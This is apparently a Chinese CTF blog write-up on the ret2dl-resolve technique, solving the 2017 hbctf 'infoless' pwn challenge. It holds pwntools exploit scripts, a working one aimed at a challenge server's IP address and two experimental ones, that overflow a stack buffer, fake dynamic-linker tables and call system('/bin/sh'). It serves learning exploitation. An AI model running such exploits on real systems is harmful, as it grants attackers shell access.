---
title: ret_2_dl_resolve
tags:
  - PWN
  - stack
  - ret2dlresolve
categories: []
date: 2017-04-12 15:12:06
---

## 前言

最近在学pwn里的沙盒的时候接触到了这个技术，瞬间会想起以前的很多题目原来是可以这样做的。技术原理很简单，理解了linux里的lazy binding就不难理解。

## 利用方式
> + 控制EIP为PLT[0]的地址，只需传递一个index_arg参数
+ 控制index_arg的大小，使reloc的位置落在可控地址内
+ 伪造reloc的内容，使sym落在可控地址内
+ 伪造sym的内容，使name落在可控地址内
+ 伪造name为任意库函数，如system

所以我们得出结论，我们最终要伪造三个节信息，分别是`.rel.plt`, `.dynsym`, `.dynstr`，并且在`dynstr`上布置我们希望调用的函数的`str`，比如`system`。并且我们要通过控制`index_args`参数和`eip`指针是的程序按照我们的设计来调用函数。

## Example

以2017hbctf第一场的pwn200来分析

程序逻辑
```
int __cdecl main()
{
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);
  read_buf();
  fflush(stdout);
  return 0;
}
```
```
ssize_t read_buf()
{
  char buf; // [sp+6h] [bp-12h]@1

  return read(0, &buf, 0x3Cu);
}
```

checksec
```
root@kali ~/c/2/p/infoless# checksec infoless 
[*] '/root/ctf-problem/2017hbctf/pwn/infoless/infoless'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

除此之外就没有信息了，所以这题考察的就是如何在缺少信息的情况下getshell，这里用到的一种技术就是ret_2_dl_resolve。

关于`.dynamic`：
```
root@kali ~/c/2/p/infoless# readelf -d infoless 

Dynamic section at offset 0x70c contains 24 entries:
  标记        类型                         名称/值
 0x00000001 (NEEDED)                     共享库：[libc.so.6]
 0x0000000c (INIT)                       0x8048340
 0x0000000d (FINI)                       0x80485c4
 0x00000019 (INIT_ARRAY)                 0x8049700
 0x0000001b (INIT_ARRAYSZ)               4 (bytes)
 0x0000001a (FINI_ARRAY)                 0x8049704
 0x0000001c (FINI_ARRAYSZ)               4 (bytes)
 0x6ffffef5 (GNU_HASH)                   0x804818c
 0x00000005 (STRTAB)                     0x804825c
 0x00000006 (SYMTAB)                     0x80481bc
 0x0000000a (STRSZ)                      109 (bytes)
 0x0000000b (SYMENT)                     16 (bytes)
 0x00000015 (DEBUG)                      0x0
 0x00000003 (PLTGOT)                     0x80497f8
 0x00000002 (PLTRELSZ)                   32 (bytes)
 0x00000014 (PLTREL)                     REL
 0x00000017 (JMPREL)                     0x8048320
 0x00000011 (REL)                        0x8048300
 0x00000012 (RELSZ)                      32 (bytes)
 0x00000013 (RELENT)                     8 (bytes)
 0x6ffffffe (VERNEED)                    0x80482e0
 0x6fffffff (VERNEEDNUM)                 1
 0x6ffffff0 (VERSYM)                     0x80482ca
 0x00000000 (NULL)                       0x0
```
ELF文件的.dynamic section里包含了ld.so用于运行时解析函数地址的信息。

通过半天多的努力终于算是理解掌握了ret_to_dl_resolve的利用方法。。正如如上所说，这里的关键点是理解linux的lazy binding的工作方式，由于要伪造三个节信息并且完全计算偏移，所以我认为不熟练的话还是需要花时间调试offset的。但是我看了别人的解法后发现了一个问题，那就是似乎`.dynamic`节似乎是可写的，那么我们似乎可以通过修改`.dynamic`的偏移信息使得直接定位`.dynstr`的地址到我们伪造的`.dynstr(bss)`上了。

参考exp:
```
#!/usr/bin/python
# -*- coding:utf-8 -*- 
 
from pwn import *
from time import *
 
vulFunAddr = 0x080484CB
readpltAddr = 0x08048380
fflushpltAddr = 0x08048390
dynstrInDynamicAddr = 0x08049750
bssAddr = 0x08049820
 
strTable = ['', 'libc.so.6','_IO_stdin_used', 'fflush', 'stdin', 'read', 'stdout', 'stderr', 'setvbuf','__libc_start_main', '__gmon_start__', 'GLIBC_2.0', '']
strTable[3] = 'system'
#将伪造的dynstr表中的fflush函数给换成system
binShellStr = '/bin/sh\0'
expOffset = 22
payloadHead = 'a'*expOffset
 
def writeStrTableToBSS(baseAddr):
   tempBSS = baseAddr
    #循环写入伪造的dynstr表
   for i in strTable:
       str = i + chr(0)
       payloadTemp = payloadHead + p32(readpltAddr) + p32(vulFunAddr) + p32(0)+ p32(tempBSS) + p32(len(str)+1)
       p.send(payloadTemp)
       sleep(0.1)
       p.send(str)
       tempBSS = tempBSS + len(str)
       sleep(0.1)
 
p = remote('123.206.81.66', 8888)
#p = remote('127.0.0.1', 8888)
#p = process('./infoless')
context.log_level = 'debug'
 
#step 1: 将binShStr写入可写的bss段中
payload1 = payloadHead + p32(readpltAddr) +p32(vulFunAddr) + p32(0) + p32(bssAddr) + p32(8)
p.send(payload1)
sleep(0.1)
p.send(binShellStr)
sleep(0.1)
 
#step 2: 将伪造的dynstr表写入binShStr后面
dynstrInBSSAddr = bssAddr +len(binShellStr) + 4
writeStrTableToBSS(dynstrInBSSAddr)
 
#step 3: 将伪造的dynstr表地址写入dynamic中相对应的索引地址
payload2 = payloadHead + p32(readpltAddr) +p32(vulFunAddr) + p32(0) + p32(dynstrInDynamicAddr) + p32(4)
p.send(payload2)
sleep(0.1)
p.send(p32(dynstrInBSSAddr))
sleep(0.1)
 
#step 4：getshell
payload3 = payloadHead + p32(fflushpltAddr)+ p32(vulFunAddr) + p32(bssAddr)
p.send(payload3)
sleep(0.1)

p.interactive()
```

## 思考

于是我有了一个想法，既然`.dynamic`节是可写的，那么`.dynstr`节是否可写呢？其他的节是否还存在可写的呢，节是否可写是否有标志位给出呢？于是我进行了以下的测试。

### 测试`.dynstr`节是否可写

exp:
```
#!/usr/bin/env python
# coding=utf-8
from pwn import *

slog = 1
local = 1
debug = 0

global p

if slog: context(log_level = 'debug')
if local:
    p = process('./infoless')
else:
    p = remote()

if local and debug:
    gdb.attach(p, open('debug'))

offset = 22
elf = ELF('./infoless')
read_plt = elf.symbols['read']
vuln_addr = 0x80484CB
bss_addr = 0x8049820
fflush_plt = elf.symbols['fflush']

def pwn():

    addr = bss_addr
    payload1 = offset * 'a' + p32(read_plt) + p32(vuln_addr) + p32(0) + p32(bss_addr) + p32(100)
    p.sendline(payload1)
    payload2 = '/bin/sh\x00'.ljust(20, 'a')
    p.sendline(payload2)

    addr = 0x8048276
    gdb,attach(p)
    payload1 = offset * 'b' + p32(read_plt) + p32(vuln_addr) + p32(0) + p32(addr) + p32(100)
    p.sendline(payload1)
    payload2 = 'system\x00'
    p.sendline(payload2)

    payload1 = 14 * 'c' + p32(fflush_plt) + p32(0) + p32(bss_addr)
    p.sendline(payload1)

if __name__ == '__main__':
    pwn()
    p.interactive()
```
嗯，测试结果不可写= =，但是当我们尝试去写的时候似乎不会报错？（应该是有一个address fault的呀- -）。

### 节的权限

通过gdb的vmmap可以得到权限。当ELF文件被加载到内存中后，系统会将多个具有相同权限Section(节)合并成一个Segment(段)，通常为代码段(可读可执行)，可读可写的数据段，和只读数据段。

```
wndbg> vmmap 
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 0x8048000  0x8049000 r-xp     1000 0      /root/ctf-problem/2017hbctf/pwn/infoless/infoless
 0x8049000  0x804a000 rw-p     1000 0      /root/ctf-problem/2017hbctf/pwn/infoless/infoless
0xf7dfa000 0xf7dfc000 rw-p     2000 0      
0xf7dfc000 0xf7fad000 r-xp   1b1000 0      /lib32/libc-2.24.so
0xf7fad000 0xf7faf000 r--p     2000 1b0000 /lib32/libc-2.24.so
0xf7faf000 0xf7fb0000 rw-p     1000 1b2000 /lib32/libc-2.24.so
0xf7fb0000 0xf7fb3000 rw-p     3000 0      
0xf7fd2000 0xf7fd4000 rw-p     2000 0      
0xf7fd4000 0xf7fd7000 r--p     3000 0      [vvar]
0xf7fd7000 0xf7fd9000 r-xp     2000 0      [vdso]
0xf7fd9000 0xf7ffb000 r-xp    22000 0      /lib32/ld-2.24.so
0xf7ffc000 0xf7ffd000 r--p     1000 22000  /lib32/ld-2.24.so
0xf7ffd000 0xf7ffe000 rw-p     1000 23000  /lib32/ld-2.24.so
0xfffdd000 0xffffe000 rw-p    21000 0      [stack]
```

### 关于传参

我的一个失败的exp：
```
#!/usr/bin/env python
# coding=utf-8
from pwn import *

slog = 1
local = 1
debug = 0

global p

if slog: context(log_level = 'debug')
if local:
    p = process('./infoless')
else:
    p = remote()

if local and debug:
    gdb.attach(p, open('debug'))


elf = ELF('./infoless')

offset = 22
# .rel.plt  reloc = reloc + .rel.plt , fake reloc_args to locate reloc on bss

# .dynsym   sym = .dynsym + reloc->info , fake reloc->info to locate sym on bss

# .dynstr   name = .dynstr + sym->value, fake sym->value to locate name on bss

#  name_str fake name_str on bss

pr = 0x08048361
relplt_addr = 0x8048320
vuln_addr = 0x80484CB
plt_addr = 0x8048370
bss_addr = 0x8049820
dynsym_addr = 0x80481bc
dynstr_addr = 0x0804825c
read_plt = elf.symbols['read']

def pwn():
    print 'bss_addr => ', hex(bss_addr)

    # send /bin/sh
    addr = bss_addr
    payload1 = offset * 'a' + p32(read_plt) + p32(vuln_addr) + p32(0) + p32(bss_addr) + p32(100)
    p.sendline(payload1)
    payload2 = '/bin/sh\x00'.ljust(20, 'a')
    p.sendline(payload2)
    
    # fake .rel.plt on bss
    # 0x0804970c      0x00000107
    addr += len(payload2)
    payload1 = offset * 'a' + p32(read_plt) + p32(vuln_addr) + p32(0) + p32(addr) + p32(100)
#    gdb.attach(p, open('debug'))
    p.sendline(payload1)
    print 'addr - relplt_addr => ', hex(addr - relplt_addr)
    off = ((addr - dynsym_addr) / 0x10 + 1) * 0x100 + 0x7
    print 'off => ', hex(off)
    payload2 = p32(elf.got['fflush']) + p32(off)
    p.sendline(payload2)
#    gdb.attach(p)

    # fake .dynsym on bss
    # 0x0000001a      0x00000000      0x00000000      0x00000012
    addr += len(payload2)
    payload1 = offset * 'a' + p32(read_plt) + p32(vuln_addr) + p32(0) + p32(addr) + p32(100)
    p.sendline(payload1)
    off = addr - dynstr_addr + 0x10
    print 'offset_dynstr => ', hex(off) # 15f0
    payload2 = p32(off) + p32(0) + p32(0) + p32(0x12)
#    gdb.attach(p, open('debug'))
    p.sendline(payload2)

    # fake .dynstr
    addr += len(payload2)
    payload1 = offset * 'a' + p32(read_plt) + p32(vuln_addr) + p32(0) + p32(addr) + p32(100)
    p.sendline(payload1)
#    gdb.attach(p, open('debug'))
    payload2 = 'system\x00'
    p.sendline(payload2)
#    gdb.attach(p, open('debug'))

    # fake reloc_args & mov eip, plt[0]
    reloc_args = bss_addr - relplt_addr + 0x14
    print 'reloc_args => ', hex(reloc_args)
    gdb.attach(p, open('debug'))
    payload1 = offset * 'a' + p32(plt_addr) + p32(reloc_args) + p32(elf.plt['fflush']) + p32(vuln_addr) + p32(bss_addr)
    p.sendline(payload1)
#    gdb.attach(p)

if __name__ == '__main__':
    pwn()
    p.interactive()
```

最后在控制`eip`到`plt[0]`的位置时，我遇到了传参的问题，当我将`reloc_adgs`压入栈中后，我无法将将要调用函数`fflush()(事实上是systm())`的参数`/bin/sh\x00`压入栈中了，这里可能需要用到rop去控制esp和栈的内容，暂时先不去研究这个。

### 其他可能的利用？

当我们可以控制`.dynamic`后是否可以改变别的值去控制程序（连接器？）解析到其他的地址上，是否还有其他的利用方式？

### x64

关于64位的利用方式应该是差不多的，暂时没精力研究了，先挖坑，以后填吧，先去研究沙盒了。

## 叹

还是太菜了，弄明白个这个玩意都要花接近一天。。。。TAT